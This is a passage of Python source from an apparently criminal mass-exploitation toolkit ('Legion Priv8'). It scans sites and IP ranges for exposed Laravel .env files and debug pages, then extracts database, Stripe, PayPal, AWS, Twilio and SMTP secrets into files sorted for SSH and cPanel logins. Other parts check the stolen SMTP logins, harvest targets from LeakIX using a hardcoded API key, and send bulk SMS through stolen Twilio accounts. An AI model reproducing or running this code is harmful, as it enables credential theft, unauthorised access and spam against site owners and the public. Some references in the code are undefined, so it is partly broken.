			save = open('Results/env/paypa.txt','a')
			save.write(url+'\n')
			save.close()
			return True
		elif "STRIPE_KEY" in text:
			if "STRIPE_KEY=" in text:
				method = '/.env'
				try:
					stripe_key = reg('\nSTRIPE_KEY=(.*?)\n', text)[0]
				except:
					stripe_key = ''
				try:
					stripe_secret = reg('\nSTRIPE_SECRET={.*?)\n', text)[0]
				except:
					stripe_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripe_key)+'\nSTRIPE_SECRET: '+str(stripe_secret)
				remover = str(build).replace('\r', '')
				save = open(o_stripe, 'a')
				save.write(remover+'\n')
				save.close()
				saveurl = open('Results/env/stripe.txt','a')
				removerurl = str(url).replace('\r', '')
				saveurl.write(removerurl+'\n')
				saveurl.close()

			elif "<td>STRIPE_SECRET</td>" in text:
				method = 'debug'
				try:
					stripe_key = reg('<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				except:
					stripe_key = ''
				try:
					stripe_secret = reg('<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				except:
					stripe_secret = ''
			build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripe_key)+'\nSTRIPE_SECRET: '+str(stripe_secret)
			remover = str(build).replace('\r', '')
			save = open('Results/debug/stripe.txt', 'a')
			save.write(remover+'\n')
			save.close()
			saveurl = open(o_stripe_site,'a')
			removerurl = str(url).replace('\r', '')
			saveurl.write(removerurl+'\n')
			saveurl.close()
		else:
			return False
	def get_database(self, text, url):
		try:
			if "DB_HOST" in text:
				if "DB_HOST=" in text:
					method = '/.env'
					try:
						db_host = reg('\nDB_HOST=(.*?)\n', text)[0]
					except:
						db_host = ''
					try:
						db_port = reg('\nDB_PORT=(.*?)\n', text)[0]
					except:
						db_port = ''
					try:
						db_name = reg('\nDB_DATABASE=(.*?)\n', text)[0]
					except:
						db_name = ''
					try:
						db_user = reg('\nDB_USERNAME=(.*?)\n', text)[0]
					except:
						db_user = ''
					try:
						db_pass = reg('\nDB_PASSWORD=(.*?)\n', text)[0]
					except:
						db_pass = ''
				elif "<td>DB_HOST</td>" in text:
					method = 'debug'
					try:
						db_host = reg('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_host = ''
					try:
						db_port = reg('<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_port = ''
					try:
						db_name = reg('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_name = ''
					try:
						db_user = reg('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_user = ''
					try:
						db_pass = reg('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_pass = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nDB_HOST: '+str(db_host)+'\nDB_PORT: '+str(db_port)+'\nDB_NAME: '+str(db_name)+'\nDB_USER: '+str(db_user)+'\nDB_PASS: '+str(db_pass)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}DATABASE {fc}[{yl}{db_name}{res}{red}|{yl}{db_user}{red}|{yl}{db_pass}{fc}]")
				save = open('Results/env/DATABASE.txt', 'a')
				save.write(remover+'\n')
				save.close()
				build_forchecker = str(url)+"|"+str(db_host)+"|"+str(db_port)+"|"+str(db_user)+"|"+str(db_pass)+"|"+str(db_name)
				build_forchecker2 = str(url)+"|22|"+str(db_user)+"|"+str(db_pass)
				remover2 = str(build_forchecker).replace('\r', '')
				remover3 = str(build_forchecker2).replace('\r', '')
				if str(db_user) == "root":
					save3 = open('Results/env/database_WHM.txt','a')
				else:
					save3 = open('Results/env/database_Cpanels.txt','a')
				save3.write(remover2+'\n')
				save3.close()
				if str(db_user) == "root":
					save4 = open('Results/env/database_ssh_root.txt','a')
				else:
					save4 = open('Results/env/database_ssh.txt','a')
				save4.write(remover3+'\n')
				save4.close()
				return True
			else:
				return False
		except:
			return False
	def get_database2(self, text, url):
		pm = pma(url)
		pmp = pm.check()
		if 'DB_USERNAME=' in text:
			method = '/.env'
			db_host = re.findall('\nDB_HOST=(.*?)\n', text)[0]
			db_dbse = re.findall('\nDB_DATABASE=(.*?)\n', text)[0]
			db_user = re.findall('\nDB_USERNAME=(.*?)\n', text)[0]
			db_pass = re.findall('\nDB_PASSWORD=(.*?)\n', text)[0]
			build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\n'
			if pmp:
				build += 'PMA: ' + str(pmp) + '\n'
			build += 'HOST: ' + str(db_host) + '\nDATABSE: ' + str(db_dbse) + '\nUSERNAME: ' + str(db_user) + '\nPASSWORD: ' + str(db_pass) + '\n'
			remover = str(build).replace('\r', '')
			if pmp:
				fp = open('Results/env/phpmyadmin.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
			else:
				fp = open('Results/env/database_PMA.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
		elif '<td>DB_USERNAME</td>' in text:
			method = 'debug'
			db_host = re.findall('<td>DB_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			db_dbse = re.findall('<td>DB_DATABASE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			db_user = re.findall('<td>DB_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			db_pass = re.findall('<td>DB_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\n'
			if pmp:
				build += 'PMA: ' + str(pmp) + '\n'
			build += 'HOST: ' + str(db_host) + '\nDATABSE: ' + str(db_dbse) + '\nUSERNAME: ' + str(db_user) + '\nPASSWORD: ' + str(db_pass) + '\n'
			remover = str(build).replace('\r', '')
			if pmp:
				fp = open('Results/debug/phpmyadmin.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
			else:
				fp = open('Results/debug/database.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
		return pmp
	def save(self, sites, names):
		s = open(names, "a+")
		s.write(sites+"\n")

		return s

	def gasken(self,url, urutan):
		global progres
		progres = progres + 1

		try:
			response_text = False
			ayey_env = laravelpaths
			cekidot = False
			eyey_result = ''
			for x in ayey_env:
				headers =  {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
				eeyey = requests.get(url+x, headers=headers, timeout=5, verify=False, allow_redirects=False).text

				if 'APP_KEY=' in eeyey:
					cekidot = True
					eyey_result = eeyey


			if cekidot:
				response_text = eyey_result
			else:
				aweu = requests.post(url, data={"0x[]":"janc0xsec"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
				if "<td>APP_KEY</td>" in aweu:
					response_text = aweu


			if response_text:
				self.save(url, 'Results/vuln.txt')
				twilio = self.get_twilio(response_text,url)
				twilio2 = self.get_database(response_text,url)
				smtp = self.get_smtp(response_text,url)
				plivo = self.get_plivo(response_text,url)
				#nexmo = self.get_nexmo(response_text,url)
				clickatell = self.get_clickatell(response_text,url)
				getdb = self.get_db(response_text,url)
				aws = self.get_aws(response_text,url)
				payment = self.payment_api(response_text,url)
				db2 = self.get_nexmo2(response_text,url)
				pma = self.get_database2(response_text,url)
				phpunit = self.phpunit(url)

				if smtp:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc}[{gr}SMTP{fc}] {fc}({gr}{x}{fc}) {gr}✓")

				if aws:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc}[{gr}AWS{fc}] {fc}({gr}{x}{fc}) {gr}✓")

				if twilio:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc} [{gr}TWILIO{fc}] {fc}({gr}{x}{fc}) {gr}✓")

				if plivo:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc}[{gr}PLIVO{fc}] {fc}({gr}{x}{fc}) {gr}✓")

				if nexmo:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc}[{gr}NEXMO{fc}] {fc}({gr}{x}{fc}) {gr}✓")

				if clickatell:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc}[{gr}CLICKATELL{fc}] {fc}({gr}{x}{fc}) {gr}✓")

				if getdb:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc}[{gr}Database{fc}] {fc}({gr}{x}{fc}) {gr}✓")

				if phpunit:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc}[{gr}PHPUNIT{fc}] {fc}({gr}{x}{fc}) {gr}✓")

			else:
				print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {red}Can\'t get everything {red}✗")
				self.save(url, 'Results/not_vuln.txt')

		except Exception as e:
			pass

exploitlegion = _exploit()



def formaturl(url):
    if not re.match('(?:http|ftp|https)://', url):
        return 'http://{}'.format(url)
    return url

def bagaincap():

	try:
		lisnya = input("\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
		trit = int(input("\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#"))

		os.system('cls' if os.name == 'nt' else 'clear')


		try:
			i = 1

			Th = ThreadPool(int(trit))

			with open(lisnya, 'r') as url:


				for x in url:
					Th.add_task(exploitlegion.gasken, formaturl(x.strip()), i)
					i += 1

			Th.wait_completion()

		except IOError as e:
			print("[-] YOUR LIST NOT FOUND !")
			sys.exit()

	except Exception as e:
		raise e
#Start Reverse
def gass(ip):
    try:
        result = requests.get('https://www.threatcrowd.org/searchApi/v2/ip/report/?ip=' + ip, timeout=20)
        j = json.loads(result.text)
        if '{"response_code":"0"}' in result.text:
            print (f'{gr}[{red}{ntime()}{gr}] {red}{ip}{res} {fc}╾┄╼{yl}[{red}BAD{yl}]')
        else:
            print (f'{gr}[{red}{ntime()}{gr}] {ip}{res} {fc}╾┄╼ {mg}[{gr}LIVE{mg}]')

            for asu in j['resolutions']:
                open('Reverse/reversed.txt', 'a').write(str(asu['domain'] + '\n'))
                print (f'[{gr}Legion Reverse{yl}] {fc}Fetching {yl}=> {gr}{ip}{res} {fc}╾┄╼ {yl} {red}╾┄╼ {gr}'+str(asu['domain']))
                clean()


    except:
        pass

def ranga(url):
    try:
        host = url.strip()
        prefix = host.split('.')
        jancok = prefix[0] + '.' + prefix[1] + '.' + prefix[2]
        for i in range(256):
            ip = jancok + '.%d' % i
            gass(ip)


    except:
        pass
#stop Reverse

#Get ENV + Debug
def prepare(sites):
    global progres
    try:
        meki = requests.get((sites + '/.env'), headers=Headers, timeout=8)
        if 'DB_PASSWORD=' in meki.text:
            print(f'{cy}{str(progres)} {gr}#{res}{str(sites)}{cy} ╾┄╼ {gr}VULN{res}')
            progres = progres + 1
            open('Debug/config-Grab.txt', 'a').write('\n---------------MY LEGION env GRAB-------------\n\n' + sites + '\n' + meki.text + '\n-----------------------------------------\n\n')
            open('Debug/Laravel_info.txt', 'a').write(sites +'/.env\n')
        else:
            print(f'{cy}{str(progres)} {red}#{res}{str(sites)}{mg} ╾┄╼ {red}NOT VULN{res}')
    except Exception as e:
        try:
            pass
        finally:
            e = None
            del e
#Clean
def clean2():
    lines_seen = set()
    Targetssa = input("\033[31;1m┌─\033[31;1m[\033[36;1mLEGION \033[32;1m+ \033[31;1mREMOVE DUPLICATES\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
    outfile = open('list-' + Targetssa, 'a')
    infile = open(Targetssa, 'r')
    for line in infile:
        if line not in lines_seen:
            outfile.write(line)
            lines_seen.add(line)

    outfile.close()
    infile.close()
    print('Duplicate removed successfully!')
    print('saved as rd-' + str(Targetssa))
    print('Load Menu On 1 sec')
    print('-------------------------------')
    time.sleep(1)
    alege()
#Leakix
def Leakix(url):
    try:
        MEMEK = input(f'{red}┌─{res}[{cy}{yl}Legion {gr}LEAKIX{res}]{gr}─{res}[{mg}/{mg}Give me your {fc}DORK{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}')
    except IndexError:
        print (kuning + '-----------------------------------------')
        print (abang + '[*]' + kuning + ' Python ' + ijo + 'x.py ' + putih + 'Name_of_defacer ' + y)
        print(Style.RESET_ALL)
        sys.exit()



    print (f'{red}┌─{res}[{gr}LEAKIX{res}]{gr}─{res}[{mg}/{mg}SCANNING NOW{mg}/{res}]\n{red}└─╼ {res}~{gr}#{MEMEK} {res}')
    for page in range(1,99999):
    	Agent1 = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
    	'Accept': 'application/json',
    	'api-key': 'nREfbPEoQFMZ8qVfODZKLqMdS2VcYNVAsb_dQrJW_1YiLIIi'
    	}
    	url = 'https://leakix.net/search?scope=service&q=' + MEMEK +  str(page)
    	sess = requests.session()
    	KONTOL = sess.get(url, timeout=10,headers=Agent1).json()
    	for MEKI in KONTOL:
    		print('\t\033[31;1m┌─\033[31;1m[\033[32;1mPAGES \033[33;1m─╼ \033[32;1m'+str(page)+'\033[31;1m]\033[36;1m'+MEKI['ip'])
    		open('ips_Laravel.txt', 'a').write(MEKI['ip']+'\n')
def Leakixap(url):
    try:
        q = input(f'{red}┌─{res}[{cy}{yl}Legion {gr}LEAKIX{res}]{gr}─{res}[{mg}/{mg}Give me your {fc}DORK{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}')
        #apikey = input('\t\033[31;1m┌─\033[31;1m[\033[36;1mLEGION SMTP \033[32;1m+ \033[31;1mDEBUG\033[31;1m]--\033[31;1m[\033[32;1mGive me your API KEY\033[31;1m]\n\t└─╼\033[32;1m#')
        if q:
            pass
        else:
            q = '*'
        all_page = 500
        for t in range(all_page):
            print (Fore.LIGHTGREEN_EX + 'PAGE :' + str(t))
            u = 'https://leakix.net/search?page=' + str(t) + '&q=' + q + '&scope=leak'
            headers = {'api-key': 'nREfbPEoQFMZ8qVfODZKLqMdS2VcYNVAsb_dQrJW_1YiLIIi',
               'Accept': 'application/json'}
            x = requests.get(u, headers=headers)
            try:
                j = json.loads(x.text)
                for j in j:
                        print (Fore.CYAN + j["ip"] + ':' + j["port"])
                        fx = open('Apache_IPS.txt', 'a')
                        fx.write(j["ip"] + ':' + j["port"] + '\n')
                        fx.close()

            except:
                print (Fore.RED + 'Limit Page !')

    except:
        print (Fore.RED + 'Error' + Fore.WHITE)
#SMTP Tester
class SMTPTESTER:
    def __init__(self):
        self.setup()
        self.configuration()
        #self.banner()
        #self.menu()
        self.smtp_check()
        #self.send_mail()

    def setup(self):
        if not os.path.isdir('CHECKER'):
            os.mkdir('CHECKER')
            #os.mkdir('CHECKER/NUMBERS')
            os.mkdir('CHECKER/SMTPS')

        #if not os.path.isdir('CHECKER/NUMBERS'):
            #os.mkdir('CHECKER/NUMBERS')
        if not os.path.isdir('CHECKER/SMTPS'):
            os.mkdir('CHECKER/SMTPS/')
        #try:
        #    self.numbers_fn = 'CHECKER/NUMBERS/' + os.listdir('CHECKER/NUMBERS')[0]
        #    with open(self.numbers_fn) as file:
        #        self.numbers = f'{fg[1]}{self.numbers_fn.split("/")[-1]}'
        #        self.targets = [x for x in file.read().splitlines() if x]
        #        if len(self.targets) == 0:
        #            self.numbers = f'{fg[0]}NO NUMBERS FOUND'
        #except IndexError:
        #    self.numbers = f'{fg[0]}NO FILE FOUND'
        try:
            self.smtps_fn = 'CHECKER/SMTPS/' + os.listdir('CHECKER/SMTPS')[0]
            with open(self.smtps_fn) as file:
                self.smtps = f'{fg[1]}{self.smtps_fn.split("/")[-1]}'
        except IndexError:
            self.smtps = f'{fg[0]}NO FILE FOUND'

    def configuration(self):
        if not os.path.isfile('sender_config.json'):
            config = {
                'sender_config': {
                    '__note_delay': 'Delay means time per second before sending next mail.',
                    'delay': 0,
                    '__note_thread_count': 'Threading Count to use to check if SMTP is live or dead.',
                    'thread_count' : 100,
                    'auto_delete_dead': False,
                    '__note_thread_count_send': 'Threading Count to use to send mail to the target numbers.',
                    'thread_count_send' : 50
            }}
            with open('sender_config.json', 'w+') as outfile:
                json.dump(config, outfile, indent=2)
        else:
            with open('sender_config.json') as outfile:
                config = json.load(outfile)
        #region Booleans
        if config['sender_config']['delay'] == 0:
            self.s1 = f'{fg[0]}{str(config["sender_config"]["delay"])}'
        else:
            self.s1 = f'{fg[1]}{str(config["sender_config"]["delay"])}'
        self.s2 = f'{fg[1]}{str(config["sender_config"]["thread_count"])}'
        self.s3 = f'{fg[1]}{str(config["sender_config"]["auto_delete_dead"])}'
        self.s4 = f'{fg[1]}{str(config["sender_config"]["thread_count_send"])}'
        self.config = config
        #endregion Booleans

    def banner(self):
        # region Banner
        print(f'''

[━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━]
            {red}    ___       __      _______               ______                _____
{cy}                __ |     / /_____ ___    |___{cy}SMTP CHECKER{res}\033[36m  ___  / _____ _______ ____(_)______ _______
{yl}               __ | /| / / _  _ \__  /| |__  ___/_  _ \__  /  _  _ \__  __ `/__  / _  __ \__  __ $
{res}                __ |/ |/ /  /  __/_  ___ |_  /    /  __/_  /___/  __/_  /_/ / _  /  / /_/ /_  / / /
            {red}    ____/|__/   \___/ /_/  |_|/_/     \___/ /_____/\___/ _\__, /  /_/   \____/ /_/ /_/
                                                                  /____/

                                              {red}PRIV8 {gr}SMTP CHECKER {res}by {gr}myL3gion
                                                {res}Visit {cy}https://mylegion.cc  {res}

                                                {yl} Telegram {res}: {gr}@{cy}myl3gion

                                                     {red} Version {res}: {gr}6.6

\033[31m[━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━]
\t\t\t\t\033[32m You Are Authenticated \033[31m[Username: \033[33mLEGION\033[31m]

        ''')
        # endregion Banner

    def log(self, msg, end='\n'):
        with lock:
            print(msg, end=end)

    def smtp_check(self):
        with open(self.smtps_fn) as file:
            self.smtp_servers = [x for x in file.read().splitlines() if x]
        self.smtp_servers = list(dict.fromkeys(self.smtp_servers))
        print('\t{0}╭╼[ {1}CHECKING SMTPS {0}]╾─╼[ {2}{3} {0}]'.format(fg[5], fg[2], fg[1], str(len(self.smtp_servers))))

        if len(self.smtp_servers) == 0:
            print(f'\t{fg[0]}[!] {fg[0]}Please provide {fg[6]}SMTPS{fg[0]} on {fg[5]}({fg[1]}CHECKER/SMTPS{fg[5]}){fg[0]}!')
            sys.exit()
        else:
            def check(smtp):
                if self.config['sender_config']['auto_delete_dead']:
                    self.log('\t{0}╰╼[ {1}LIVE SMTPS {0}]╾─╼[ {2}{3} {0}]'.format(fg[5], fg[2], fg[1], str(len(self.smtps))), end='\r')

                else:
                    self.log('\t{0}╰╼[ {2}LIVE SMTPS {0}]╾─╼[ {2}{3} {0}]╾─╼[ {4}DEAD SMTPS {0}]╾─╼[ {4}{5} ]'.format(fg[5], fg[2], fg[1], str(len(self.smtps)), fg[0], self.dead_count), end='\r')



                host, port, user, passwd = smtp.split('|')
                smtp_client = smtplib.SMTP_SSL if port == '465' else smtplib.SMTP
                try:
                    server = smtp_client(host, int(port), timeout=10)
                    server.ehlo_or_helo_if_needed()
                    if port != '465':
                        server.starttls()
                    server.login(user, passwd)
                    self.log('\t{0}│ [{1}LIVE{0}]╾╼[{2}{3}{0}]'.format(fg[5], fg[1], fg[6], smtp.replace('|', f'{fg[2]}|{fg[6]}')))
                    open('CHECKER/SMTPS/Live_SMTP.txt', 'a').write(smtp+'\n')
                    self.smtps[f'{user}|{passwd}'] = {
                        'host': host,
                        'port': port,
                        'user': user,
                        'pass': passwd,
                        'server': server
                    }
                except Exception as error:
                    self.dead_count += 1
                    auth_log.error('[{}] - [{}]'.format(host, str(error)))
                    self.log('\t{0}│ [{1}DEAD{0}]╾╼[{2}{3}{0}]'.format(fg[5], fg[0], fg[6], smtp.replace('|', f'{fg[2]}|{fg[6]}')))
                    open('CHECKER/SMTPS/DEAD_SMTP.txt', 'a').write(smtp+'\n')
                    if self.config['sender_config']['auto_delete_dead']:
                        with open(self.smtps_fn) as file:
                            saved = file.read().splitlines()
                        with open(self.smtps_fn, 'w+') as file:
                            for saved_smtp in saved:
                                if saved_smtp != smtp:
                                    file.write(f'{saved_smtp}\n')
                if self.config['sender_config']['auto_delete_dead']:
                    self.log('\t{0}╰╼[ {1}LIVE SMTPS {0}]╾─╼[ {2}{3} {0}]╾─╼[ {1}DEAD SMTPS {0}]╾─╼[ {4}{5} {0}]'.format(fg[5], fg[2], fg[1], str(len(self.smtps)), fg[0], self.dead_count), end='\r')
                else:
                    self.log('\t{0}╰╼[ {1}LIVE SMTPS {0}]╾─╼[ {2}{3} {0}]'.format(fg[5], fg[2], fg[1], str(len(self.smtps))), end='\r')

            def worker():
                while True:
                    try:
                        smtp = self.smtp_servers.pop()
                    except IndexError:
                        break

                    try:
                        check(smtp)
                    except:
                        pass

            self.smtps = {}
            self.dead_count = 0
            thread_count = int(self.config['sender_config']['thread_count'])
            if thread_count > len(self.smtp_servers):
                thread_count = len(self.smtp_servers)
            threads = []
            for _ in range(thread_count):
                t = Thread(target=worker)
                t.start()
                threads.append(t)
            for thread in threads:
                thread.join()
#Filter laravel
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}
def filter2(star):
    try:
       lavcheck(star)
    except:
       pass
def lavcheck (star):
    portiamo = porting

    for ilu in portiamo:

        if "://" in star:
          star = star
        else:
          star = "http://" + star

        star = star.replace('\n', '').replace('\r', '')
        url = star + "/.env"
        check = requests.get(url+ilu, headers=headers, timeout=3)
        resp = check.text

        print(f'{fc}╭╼[{yl}LARAVELS CMS{red}]╾─╼[ {res}{star}{ilu} {red}]')
        try:
            if "DB_HOST" in resp:

                print(f'{fc}╰╼[{gr}LIVE LARAVELS{fc}]╾─╼[ {res}{star}{ilu} {fc}]')

                mrigel = open("CMS/Laravel.txt", "a")
                mrigel.write(f'{star}{ilu}\n')
            else:
                print(f'{fc}╰╼[{red}DEAD LARAVELS{fc}]╾─╼[ {res}{star}{ilu} {fc}]')

        except:
            pass
#Filter Apache
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}
def filter1(star):
    try:
       apachecheck(star)
    except:
       pass
def apachecheck (star):
    portiamo = porting

    for ilu in portiamo:
        if "://" in star:
          star = star
        else:
          star = "http://" + star
        star = star.replace('\n', '').replace('\r', '')
        url = star + "/_profiler/phpinfo"
        check = requests.get(url+ilu, headers=headers, timeout=3)
        resp = check.text
        try:
            if "phpinfo()" in resp:
                print(f"Apache {gr}OK{res} => {star}{ilu}")
                mrigel = open("CMS/Apache.txt", "a")
                mrigel.write(f'{star}{ilu}\n')
            else:
                print(f"{red}Not{res} Apache => {star}{ilu}")
        except:
            pass
def addapache():
    text = open(input(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Give me your {fc}List{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}')).read()
    for i in text.split('\n'):
    	if ':443' in i:
    		url = 'https://' + i
    	else:
    		url = 'http://' + i
    	open('CMS/added_Apache.txt','a').write(url + '\n')
    	print(f"{red}[{cy}{url}{red}]")
#parse http
def lega1(sites):
    if 'http' not in sites:
        site = 'http://' + sites
        prepare(site)
    else:
        prepare(sites)
#ip Ranger laravel
class Master:


	def __init__(self):

		if system() == 'Linux':
			os.system('clear')
		if system() == 'Windows':
			os.system('cls')




	def com_rce(self,url):


		try:



			req_rce = requests.get(url+'/.env', timeout=5, verify=False, allow_redirects=False)
			req_rce3 = requests.get(url+'/?<play>withme</>', timeout=30, verify=False, allow_redirects=False)
			req_rce4 = requests.post(url, data={"[]":"[]"}, timeout=30, verify=False, allow_redirects=False)
			req_rce5 = requests.post(url, data={"html[]":"true"}, timeout=30, verify=False, allow_redirects=False)

			if 'APP_KEY' in req_rce.text:

				print (f'{gr}# {res}{url}{red} ─ {gr}GET ENV')
				open('Ipgen/url_envvuln.txt', 'a').write(url+'\n')

			if '<td>APP_KEY</td>' in req_rce3.text:

				print (f'{gr}# {res}{url}{red} ─ {gr}DEBUG')
				open('Ipgen/url_debug.txt', 'a').write(url+'\n')

			if '<td>APP_KEY</td>' in req_rce4.text:

				print (f'{gr}# {res}{url}{red} ─ {gr}DEBUG2')
				open('Ipgen/url_debug2.txt', 'a').write(url+'\n')

			if 'email-smtp' in req_rce5.text:

				print (f'{gr}# {res}{url}{red} ─ {gr}AWS SMTP')
				open('Ipgen/smtpaws.txt', 'a').write(url+'\n')

				open('Ipgen/smtpaws.txt', 'a').write(url+'\n')
			if 'AKIA' in req_rce5.text:

				print (f'{gr}# {res}{url}{red} ─ {gr}AWS SMTP')
				open('Ipgen/smtpaws.txt', 'a').write(url+'\n')

			if 'TWILIO' in req_rce5.text:

				print (f'{gr}# {res}{url}{red} ─ {gr}TWILIO')
				open('Ipgen/twilio.txt', 'a').write(url+'\n')

			if 'apikey' in req_rce5.text or 'SG.' in req_rce5.text:

				print (f'{gr}# {res}{url}{red} ─ {gr}TWILIO')
				open('Ipgen/sendgrid.txt', 'a').write(url+'\n')


			else:

				print (f'{red}# {res}{url}{red} ─ {red}Failed range')
		except:
			pass

def rce_url(url, user_agent):

	try:
		headers = {
		'User-Agent': 'LEGION',
		'x-forwarded-for': user_agent
		}
		cookies = requests.get(url,headers=headers).cookies
		for _ in range(256):
			response = requests.get(url, headers=headers,cookies=cookies)
		return response

	except:
		pass
BotMaster = Master()
def MyLove(url):

	try:

		url.replace('http://', '').replace('http://', '')
		site = 'http://'+url
		BotMaster.com_rce(site)

	except:
		pass
#SMS Sender Twilio
def twillio_sender():
    try:
        a = input(f'{red}┌─{res}[{cy}Legion {yl}TWILIO{res}]{gr}─{res}[{mg}/{gr}Give me your {fc}Account SID{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}')
        t = input(f'{red}┌─{res}[{cy}Legion {yl}TWILIO{res}]{gr}─{res}[{mg}/{gr}Give me your Auth Token{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}')
        phonelist = input(f'{red}┌─{res}[{cy}Legion {yl}TWILIO{res}]{gr}─{res}[{mg}/{gr}Give me your {fc}Phone Number List{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}')
        list = open(phonelist, 'r')
        lista = list.read().split('\n')
        nopetest = '+923117708953'

        time.sleep(1)
        print(f" {fc}Please wait..\n{yl}checking Your Twilio")
        time.sleep(1)
        date = datetime.datetime.now().strftime('%Y-%m-%d')
        balance = get_balance(a,t)
        number = get_phone(a,t)
        type = get_type(a,t)
        bod ='test'
        send = send_sms(a,t,bod,number,nopetest)
        if send == 'die':
            status = f'{red}┌─{res}[{red}CANT SEND SMS{res}]'
        else:
            status = 'LIVE'
        print ("------------------------------------------------")
        print ("\033[36m [\033[32mSTATUS\033[36m] \033[36m─╼\033[32m {}".format(str(status)))
        print ("\033[36m [\033[33mAccount SID\033[36m] \033[36m─╼\033[32m {}".format(str(a)))
        print ("\033[36m [\033[34mAuth Key\033[36m] \033[36m─╼\033[32m  {}".format(str(t)))
        print ("\033[36m [\033[32mBalance\033[36m] \033[36m─╼\033[32m  {}".format(str(balance)))
        print ("\033[36m [\033[33mPhone Number list\033[36m] \033[36m─╼\033[32m {}".format(str(number)))
        print ("\033[36m [\033[35mAccount Type\033[36m] \033[36m─╼\033[32m {}".format(str(type)))
        print ("------------------------------------------------")
        open('SMS_Sender/twilio_result_check.txt','a').write("[+] STATUS : {}\n[+] Account SID : {}\n[+] Auth Key : {}\n[+] Balance : {}\n[+] Phone number list : {}\n[+] Account Type : {} \n\n".format(str(status),str(a),str(t),str(balance),str(number),str(type)))

        bod = input(f'{red}┌─{res}[{cy}Legion {yl}TWILIO{res}]{gr}─{res}[{mg}/{gr}Enter the Message{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}')
        if "LIVE" in str(status):
            for i in lista:
                try:
                    if '+1' not in i:
                        nope = '+1'+i
                    else:
                        nope = i
                except:
                    continue
                send = send_sms(a,t,bod,number,str(nope))
                if send == 'die':
                    print("\033[31m Failed Send  \t\033[36m =>\033[0m  "+str(nope)+" | Balance : "+str(get_balance(a,t)))
                    open('SMS_Sender/fail_send.txt','a').write(nope+'\n')
                else:
                    print("\033[32m Success Send \t\033[36m =>\033[0m  "+str(nope)+" | Balance : "+str(get_balance(a,t)))
                    open('SMS_Sender/success_send.txt','a').write(nope+'\n')
                time.sleep(1)
    except:
        print(f"{red}┌─{red}[{red}INVALID CREDENTIALS{red}]")
#USA SMS Sender
class USASMSSender:
    def __init__(self):
        self.setup()
        self.configuration()
        self.banner()
        self.menu()
        self.smtp_check()
        self.send_mail()

    def setup(self):
        if not os.path.isdir('SMS'):
            os.mkdir('SMS')
            os.mkdir('SMS/NUMBERS')
            os.mkdir('SMS/SMTPS')
        if not os.path.isdir('SMS/NUMBERS'):
            os.mkdir('SMS/NUMBERS')
